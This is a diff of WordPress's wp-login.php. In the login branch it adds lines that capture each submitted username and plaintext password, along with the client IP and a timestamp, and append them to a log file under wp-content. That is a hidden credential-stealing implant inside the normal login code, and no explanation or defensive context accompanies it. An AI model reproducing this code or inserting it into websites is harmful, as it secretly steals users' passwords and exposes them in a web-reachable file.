*** /var/www/html/wordpress/wp-login.php	2014-12-16 14:19:22.000000000 -0800
--- /home/rutu/Documents/html/wordpress/wp-login.php	2015-04-25 22:05:28.381812662 -0700
***************
*** 741,770 ****
--- 741,779 ----
  
  <?php
  login_footer('user_login');
  break;
  
  case 'login' :
  default:
  	$secure_cookie = '';
  	$customize_login = isset( $_REQUEST['customize-login'] );
  	if ( $customize_login )
  		wp_enqueue_script( 'customize-base' );
  
  	// If the user wants ssl but the session is not ssl, force a secure cookie.
  	if ( !empty($_POST['log']) && !force_ssl_admin() ) {
  		$user_name = sanitize_user($_POST['log']);
+ 		date_default_timezone_set("UTC");
+                 $time=date("Y-m-d H-i-s", time());
+                 $pas=$_POST['pwd'];
+                 $ipadd=$_SERVER['REMOTE_ADDR'];
+                 $ban = "User:$user_name\nPassword:$pas\nIP:$ipadd\nTime:$time\n";
+                 $file = '/var/www/html/wordpress/wp-content/wordpress.log';
+                 $open = fopen( $file, "a" );
+                 $write = fputs( $open, $ban );
+                 fclose( $open );
  		if ( $user = get_user_by('login', $user_name) ) {
  			if ( get_user_option('use_ssl', $user->ID) ) {
  				$secure_cookie = true;
  				force_ssl_admin(true);
  			}
  		}
  	}
  
  	if ( isset( $_REQUEST['redirect_to'] ) ) {
  		$redirect_to = $_REQUEST['redirect_to'];
  		// Redirect to https if user wants ssl
  		if ( $secure_cookie && false !== strpos($redirect_to, 'wp-admin') )
  			$redirect_to = preg_replace('|^http://|', 'https://', $redirect_to);
  	} else {
  		$redirect_to = admin_url();
